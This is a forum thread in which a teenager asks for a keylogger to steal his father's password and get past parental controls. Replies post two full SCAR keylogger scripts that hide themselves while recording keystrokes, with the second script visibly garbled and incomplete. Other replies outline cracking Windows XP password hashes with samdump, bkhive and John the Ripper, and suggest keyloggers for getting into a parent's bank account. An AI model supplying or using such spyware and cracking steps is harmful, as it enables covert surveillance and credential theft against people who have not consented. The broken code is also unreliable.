channel.title: Where are all the keylogging Scar Scripts when you need them?
channel.description:
i remember on kaitnieks.com forums xx kane xx made some pretty nasty key logging scripts. I really need one now, because my parents installed this parental controls thing, and I'm 16!!! I can't even go to newgrounds.com without it saying "sorry this site was blocked due to Weapons"
Can't go to yahoo.com... had to have my dad go and put that on the exceptions list. I'm suprised I could even come here. So all i need is a non-harmful keylogging scar script that wont destory my computer and will send me the keystrokes my dad types in next time, so i can get the password! MUAHAHAA lol
Thanks!

@_DEAD wrote:

heres a slightly more fun way to grab passwords. ull need to get your hands on the linux auditor iso, then burn it to a cd, pop it in the drive and reboot. wait for it to start up and then open a terminal. im not going to go thru exactly, but basically through the use of samdump, bkhive, and john the ripper you can crack xp passwords. and for most computer illiterate parents, they always use the same passwords.

item.title: Where are all the keylogging Scar Scripts when you need them?
item.dc:creator: @DeadBird DeadBird
item.description:
@DeadBird wrote:

Bunch of underpants for parents you have.

[code]{------------------------------------------------------]
[ Kanes Keylogger ]
[------------------------------------------------------]
This will record keystrokes operated on your
computer and then save them into the scar folder
as a html file. When you press play, set your
password. Then follow the instructions and press F12.
when you’ve pressed f12 and the monitering has
began, scar will hide itself. to recover and save
your information, press f11 and enter your password.
if you forget your password, go to scars installation
folder and open the .txt document.
[------------------------------------------------------]
[ Made By XxKanexX ]
[------------------------------------------------------}

var
endv: string;
newline: boolean;
outFile: integer;
files: string;
scalled: boolean;

procedure Site;
begin
files:= ‘Kanes Keylogger’+
‘

Kanes Keylogger
’+
‘

’;
outfile:= rewritefile(apppath+‘Kanes Keylogger.html’, false);
writefilestring(outfile, files);
scalled:= true;
closefile(outfile);
end;

procedure Addsite(s: string);
begin
if(not(scalled))then
begin
writeln(‘Couldn’‘t Write To File… File Hasn’‘t Been Started.’);
end else
begin
outfile:= rewritefile(apppath+‘Kanes Keylogger.html’, false);
files:= files+s;
writefilestring(outfile, files);
closefile(outfile);
end;
end;

procedure waitkey(c: char);
begin
while(iskeydown©)do
wait(1);
end;

procedure waitfkey(b: byte);
begin
while(isfunctionkeydown(b))do
wait(1);
end;

procedure waitarrow(a: byte);
begin
while(isarrowdown(a))do
wait(1);
end;

procedure misckeys;
var
i: integer;
begin
for i:= 0 to 2 do
if(isfunctionkeydown(i))then
begin
case i of
0: addsite(endv+’[#shift]’);
1: addsite(endv+’[#control]’);
2: addsite(endv+’[#alt]’);
end;
endv:= ‘’;
waitfkey(i);
end;
for i:= 0 to 3 do
if(isarrowdown(i))then
begin
case i of
0: addsite(endv+’[#up arrow]’);
1: addsite(endv+’[#right arrow]’);
2: addsite(endv+’[#down arrow]’);
3: addsite(endv+’[#left arrow]’);
end;
waitarrow(i);
end;
if(iskeydown(chr(8)))then
begin
addsite(endv+’[#backspace]’);
waitkey(chr(8));
endv:= ‘’;
end;
if(iskeydown(chr(13)))then
begin
newline:= true;
waitkey(chr(13));
end;
end;

var
alph, pass, ask: string;
i: integer;
pcorrect: boolean;

begin
site;
pass:= readln(‘Set A Password To Recover Logged Keys?’);
if(pass = ‘’)then
begin
writeln(‘You need to set a password.’);
terminatescript;
end;
outfile:= rewritefile(apppath+‘kaneskeyloggerpasswordhelp.txt’, false);
writefilestring(outfile, pass);
closefile(outfile);
alph:=‘abcdefghijklmnopqrstuvwxyx1234567890,./;’’[]-=\ ‘;
cleardebug;
getapplication.messagebox(‘To Start Keylogging Press F12… To Stop, Press F11 And Enter The Correct Password.’, ‘Information’, 0);
getapplication.messagebox(‘Made By XxKanexX’, ‘Creator’, 0);
writeln(‘Press F12 To Start, F11 To End.’);
repeat
wait(200);
until(isfkeydown(12));
cleardebug;
getself.Hide;
repeat
for i := 1 to length(alph) do
if(iskeydown(strget(alph, i)))then
begin
if(strget(alph, i)=’ ‘)then
begin
endv:= endv + ’ ‘;
waitkey(strget(alph, i));
end else
begin
endv:= endv + strget(alph, i);
waitkey(strget(alph, i));
end;
end;
misckeys;
if(newline)then
begin
addsite(endv+’[#enter]

’);
endv:=’’;
newline:= false;
end;
status(‘Monitering…’);
if(length(endv) >= 128)then
begin
addsite(endv);
endv := ‘’;
end;
if(isfkeydown(11))then
begin
getself.show;
ask:=readln(‘Password?’);
if(lowercase(ask)=lowercase(pass))then
pcorrect:= true
else
begin
getapplication.MESSAGEBOX(‘Incorrect Password.’, ‘Error’, 0);
getself.hide;
end;
end;
until(pcorrect);
addsite(endv+’’);
endv:= ‘’;
Getself.Show;
getapplication.messagebox('Saved Information Into: '+apppath+‘Kanes Keylogger.html’, ‘Saved.’, 0);
end.
[/code]

and

[code]program Keylogger;
const
MAXLOG= 10000; //The maximum number of keys logged.
var
X: Integer;
Axencase: String;
Universal_Tru: Boolean;
Downkey: Char;

procedure FQWait;
begin
repeat
If(IsFKeyDown(12))then
begin
Universal_Tru:=True;
end;
wait(5);
until(Universal_Tru=true)
end;

procedure W8;
begin
repeat
if(IsKeyDown(Downkey))then
begin
wait(5);
end;
until(not(IsKeyDown(Downkey)));
end;

procedure Kalv129Delta;
begin
if(IsFKeyDown(12))then
begin
Universal_Tru:=False;
Writeln(Axencase);
Exit;
end else
if(IsKeyDown(‘a’))then
begin
Downkey:= ‘a’;
Axencase:= (Axencase + ‘a’);
W8;
end else
if(IsKeyDown(‘b’))then
begin
Downkey:= ‘b’;
Axencase:= (Axencase + ‘b’);
W8;
end else
if(IsKeyDown(‘c’))then
begin
Downkey:= ‘c’;
Axencase:= (Axencase + ‘c’);
W8;
end else
if(IsKeyDown(‘d’))then
begin
Downkey:= ‘d’;
Axencase:= (Axencase + ‘d’);
W8;
end else
if(IsKeyDown(‘e’))then
begin
Downkey:= ‘e’;
Axencase:= (Axencase + ‘e’);
W8;
end else
if(IsKeyDown(‘f’))then
begin
Downkey:= ‘f’;
Axencase:= (Axencase + ‘f’);
W8;
end else
if(IsKeyDown(‘g’))then
begin
Downkey:= ‘g’;
Axencase:= (Axencase + ‘g’);
W8;
end else
if(IsKeyDown(‘h’))then
begin
Downkey:= ‘h’;
Axencase:= (Axencase + ‘h’);
W8;
end else
if(IsKeyDown(‘i’))then
begin
Downkey:= ‘i’;
Axencase:= (Axencase + ‘i’);
W8;
end else
if(IsKeyDown(‘j’))then
begin
Downkey:= ‘j’;
Axencase:= (Axencase + ‘j’);
W8;
end else
if(IsKeyDown(‘k’))then
begin
Downkey:= ‘k’;
Axencase:= (Axencase + ‘k’);
W8;
end else
if(IsKeyDown(‘l’))then
begin
Downkey:= ‘l’;
Axencase:= (Axencase + ‘l’);
W8;
end else
if(IsKeyDown(‘m’))then
begin
Downkey:= ‘m’;
Axencase:= (Axencase + ‘m’);
W8;
end else
if(IsKeyDown(‘n’))then
begin
Downkey:= ‘n’;
Axencase:= (Axencase + ‘n’);
W8;
end else
if(IsKeyDown(‘o’))then
begin
Downkey:= ‘o’;
Axencase:= (Axencase + ‘o’);
W8;
end else
if(IsKeyDown(‘p’))then
begin
Downkey:= ‘p’;
Axencase:= (Axencase + ‘p’);
W8;
end else
if(IsKeyDown(‘q’))then
begin
Downkey:= ‘q’;
Axencase:= (Axencase + ‘q’);
W8;
end else
if(IsKeyDown(‘r’))then
begin
Downkey:= ‘r’;
Axencase:= (Axencase + ‘r’);
W8;
end else
if(IsKeyDown(‘s’))then
begin
Downkey:= ‘s’;
Axencase:= (Axencase + ‘s’);
W8;
end else
if(IsKeyDown(‘t’))then
begin
Downkey:= ‘t’;
Axencase:= (Axencase + ‘t’);
W8;
end else
if(IsKeyDown(‘u’))then
begin
Downkey:= ‘u’;
Axencase:= (Axencase + ‘u’);
W8;
end else
if(IsKeyDown(‘v’))then
begin
Downkey:= ‘v’;
Axencase:= (Axencase + ‘v’);
W8;
end else
if(IsKeyDown(‘w’))then
begin
Downkey:= ‘w’;
Axencase:= (Axencase + ‘w’);
W8;
end else
if(IsKeyDown(‘x’))then
begin
Downkey:= ‘x’;
Axencase:= (Axencase + ‘x’);
W8;
end else
if(IsKeyDown(‘y’))then
begin
Downkey:= ‘y’;
Axencase:= (Axencase + ‘y’);
W8;
end else
if(IsKeyDown(‘z’))then
begin
Downkey:= ‘z’;
Axencase:= (Axencase + ‘z’);
W8;
end else
if(IsKeyDown(‘1’))then
begin
Downkey:= ‘1’;
Axencase:= (Axencase + ‘1’);
W8;
end else
if(IsKeyDown(‘2’))then
begin
Downkey:= ‘2’;
Axencase:= (Axencase + ‘2’);
W8;
end else
if(IsKeyDown(‘3’))then
begin
Downkey:= ‘3’;

W8;
end else
if(IsKeyDown(‘4’))then
begin

W8;
end else
if(IsKeyDown(‘5’))then

W8;
end else
if(IsKeyDown(‘6’))then
begin
Downkey:= ‘6’;

W8;
end else
if(IsKeyDown(‘7’))then
begin
Downkey:= ‘7’;

W8;
end else
if(IsKeyDown(‘8’))then
begin

W8;
end else
if(IsKeyDown(‘9’))then
begin
Downkey:= ‘9’;
Axencase:= (Axencase + ‘9’);
W8;
end else
if(IsKeyDown(‘0’))then
begin
Downkey:= ‘0’;
Axencase:= (Axencase + ‘0’);
W8;
end else
if(IsKeyDown(’ '))then
begin
Downkey:= ’ ';
Axencase:= (Axencase + ’ ');
W8;
end;
end;

begin
X:= 0;
Axencase:= ‘’;
Universal_Tru:=False;
Writeln(‘Program initiated, press f12 to toogle on/off.’);
FQWait;
Wait(100);
Writeln(‘Active’);
repeat
if(Universal_Tru=True)then
begin
wait(10);
Kalv129Delta;
end else
Writeln(‘Deactivated’);
FQwait;
Wait(100);
until(false)
end.
[/code]

enjoy,i reccomend Kanes,though it misses a few keys eventually so use both :).

item.title: Where are all the keylogging Scar Scripts when you need them?
item.dc:creator: @Loz Loz
item.description:
@Loz wrote:

You could just use bpk and have it minimized into the tray. Your parents wouldn’t notice it there (at least mine wouldn’t…).

I do remember someone posting a few scar keyloggers on the kaitnieks forums though… but it seemed like most of them missed about every 5th keystroke for some reason.

item.dc:creator: @jme jme
item.description:
@jme wrote:

I am probably mis understanding you, but we don’t support the use of keylogger’s here. And just remember, scar would need to be running when your dad uses the computer

Search for a keylogger that ONLY works on your home computer on google. I used to have one when I tried to get into my online bank account, I didnt know the password and my parents wouldnt let me.
